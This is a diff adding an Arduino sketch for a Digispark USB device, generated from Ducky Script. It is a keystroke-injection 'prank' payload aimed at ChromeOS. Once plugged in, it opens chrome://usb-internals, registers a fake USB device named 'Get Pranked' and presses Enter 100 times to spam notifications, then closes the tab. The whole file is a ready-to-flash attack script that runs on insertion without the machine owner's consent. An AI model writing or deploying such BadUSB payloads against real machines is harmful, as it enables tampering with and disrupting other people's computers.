@@ -1,0 +1,70 @@
+// [ ===== Created using duckify.huhn.me @ dev 356a9805 ===== ] //
+// Duckify is a free and Open-Source web-app for converting Ducky Script into Arduino code.
+// Please consider supporting us on ko-fi.com/spacehuhn <3
+// Learn more about us at spacehuhn.com
+
+// Platform: Digispark
+// Keyboard Layout: US
+
+#include "DigiKeyboard.h"
+
+// chrome://usb-internals
+const uint8_t key_arr_0[] PROGMEM = {0,6, 0,11, 0,21, 0,18, 0,16, 0,8, 2,51, 0,56, 0,56, 0,24, 0,22, 0,5, 0,45, 0,12, 0,17, 0,23, 0,8, 0,21, 0,17, 0,4, 0,15, 0,22};
+// Get Pranked
+const uint8_t key_arr_1[] PROGMEM = {2,10, 0,8, 0,23, 0,44, 2,19, 0,21, 0,4, 0,17, 0,14, 0,8, 0,7};
+// 6969420
+const uint8_t key_arr_2[] PROGMEM = {0,35, 0,38, 0,35, 0,38, 0,33, 0,31, 0,39};
+// https://example.com
+const uint8_t key_arr_3[] PROGMEM = {0,11, 0,23, 0,23, 0,19, 0,22, 2,51, 0,56, 0,56, 0,8, 0,27, 0,4, 0,16, 0,19, 0,15, 0,8, 0,55, 0,6, 0,18, 0,16};
+
+void duckyString(const uint8_t* keys, size_t len) {  
+    for(size_t i=0; i<len; i+=2) {
+        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
+    }
+}
+
+void setup() {
+    pinMode(1, OUTPUT); // Enable LED
+    digitalWrite(1, LOW); // Turn LED off
+    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed
+
+    // Title: Spam Notifications
+    // Author: Fclown
+    // Description: This payload is meant to spam USB notifications
+    // Target: ChromeOS (Tested on: Dell 3110)
+    DigiKeyboard.delay(1000);
+    DigiKeyboard.sendKeyStroke(23, 1); // CTRL N
+    DigiKeyboard.delay(1500);
+    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING chrome://usb-internals
+    DigiKeyboard.delay(250);
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    DigiKeyboard.delay(2000);
+    DigiKeyboard.sendKeyStroke(43, 0); // TAB
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(43, 0); // TAB
+    DigiKeyboard.delay(50);
+    // The USB's Name to be spammed
+    duckyString(key_arr_1, sizeof(key_arr_1)); // STRING Get Pranked
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(43, 0); // TAB
+    DigiKeyboard.delay(50);
+    // Serial number (not required)
+    duckyString(key_arr_2, sizeof(key_arr_2)); // STRING 6969420
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(43, 0); // TAB
+    DigiKeyboard.delay(50);
+    // Landing page (They wont see it)
+    duckyString(key_arr_3, sizeof(key_arr_3)); // STRING https://example.com
+    DigiKeyboard.delay(50);
+    DigiKeyboard.sendKeyStroke(43, 0); // TAB
+    DigiKeyboard.delay(50);
+    for(size_t i=0; i<100; ++i) {
+    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
+    DigiKeyboard.delay(25);
+    }
+    DigiKeyboard.sendKeyStroke(26, 1); // CTRL W
+}
+
+void loop() {}
+
+// Created using duckify.huhn.me @ dev 356a9805
